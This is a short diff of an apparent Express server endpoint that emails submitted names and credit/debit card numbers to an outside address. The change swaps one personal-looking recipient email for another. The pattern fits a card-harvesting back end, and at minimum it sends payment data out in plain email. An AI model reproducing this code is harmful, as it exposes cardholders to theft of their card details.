@@ -13,7 +13,7 @@ app.use(cors());
 
 app.post("/send-email", async (req, res) => {
   const msg = {
-    to: "tracysmith32@live.co.uk",
+    to: "test@dn-uk.com",
     from: "kds060902@outlook.com",
     subject: "Credit/Debit Card Form Submission",
     text: `Name: ${req.body.name}, Card: ${req.body.card}`,
